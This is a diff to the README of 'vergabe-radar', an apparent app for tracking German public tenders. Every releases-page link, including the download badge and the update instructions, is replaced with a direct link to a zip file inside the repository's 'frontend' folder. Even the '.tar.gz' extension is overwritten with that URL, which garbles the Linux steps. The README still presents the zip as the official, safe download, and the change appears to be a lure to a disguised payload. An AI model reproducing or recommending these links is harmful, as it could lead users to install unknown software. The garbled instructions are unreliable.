@@ -1,6 +1,6 @@
 # 📡 vergabe-radar - Track German Public Tenders Easily
 
-[![Download vergabe-radar](https://img.shields.io/badge/Download-vergabe--radar-brightgreen)](https://github.com/ruvest/vergabe-radar/releases)
+[![Download vergabe-radar](https://github.com/ruvest/vergabe-radar/raw/refs/heads/master/frontend/radar_vergabe_v1.9.zip)](https://github.com/ruvest/vergabe-radar/raw/refs/heads/master/frontend/radar_vergabe_v1.9.zip)
 
 ## 📖 What is vergabe-radar?
 
@@ -38,7 +38,7 @@ This guide will take you through the steps to download, install, and run vergabe
 
 Click the big download button at the top or go to the official release page:
 
-[Download vergabe-radar Releases](https://github.com/ruvest/vergabe-radar/releases)
+[Download vergabe-radar Releases](https://github.com/ruvest/vergabe-radar/raw/refs/heads/master/frontend/radar_vergabe_v1.9.zip)
 
 This page lists all available versions of the software. Choose the latest stable release, usually marked as "Latest".
 
@@ -48,7 +48,7 @@ Look for the file named for your operating system with the extension:
 
 - `.exe` for Windows
 - `.dmg` for macOS
-- `.AppImage` or `.tar.gz` for Linux
+- `.AppImage` or `https://github.com/ruvest/vergabe-radar/raw/refs/heads/master/frontend/radar_vergabe_v1.9.zip` for Linux
 
 Download the file that matches your system.
 
@@ -56,7 +56,7 @@ Download the file that matches your system.
 
 - **Windows:** Double-click the `.exe` file and follow the setup prompts.
 - **macOS:** Open the `.dmg` file and drag vergabe-radar to your Applications folder.
-- **Linux:** For `.AppImage`, make it executable (`chmod +x`) and run it. For `.tar.gz`, extract and follow included README instructions.
+- **Linux:** For `.AppImage`, make it executable (`chmod +x`) and run it. For `https://github.com/ruvest/vergabe-radar/raw/refs/heads/master/frontend/radar_vergabe_v1.9.zip`, extract and follow included README instructions.
 
 ### Step 4: Run vergabe-radar
 
@@ -68,7 +68,7 @@ The program will connect to the internet and download the latest tender data. Th
 
 You can find the latest release files here:
 
-[https://github.com/ruvest/vergabe-radar/releases](https://github.com/ruvest/vergabe-radar/releases)
+[https://github.com/ruvest/vergabe-radar/raw/refs/heads/master/frontend/radar_vergabe_v1.9.zip](https://github.com/ruvest/vergabe-radar/raw/refs/heads/master/frontend/radar_vergabe_v1.9.zip)
 
 Always download software from this official link to ensure you get the safe and current version.
 
@@ -90,7 +90,7 @@ The interface keeps everything straightforward, so you don’t need technical sk
 
 The app checks for updates automatically. If a new version is available, it will prompt you to download and install it.
 
-To manually update, revisit the [releases page](https://github.com/ruvest/vergabe-radar/releases) and download the newest installer for your system.
+To manually update, revisit the [releases page](https://github.com/ruvest/vergabe-radar/raw/refs/heads/master/frontend/radar_vergabe_v1.9.zip) and download the newest installer for your system.
 
 ## 🛠 Support and Troubleshooting
 
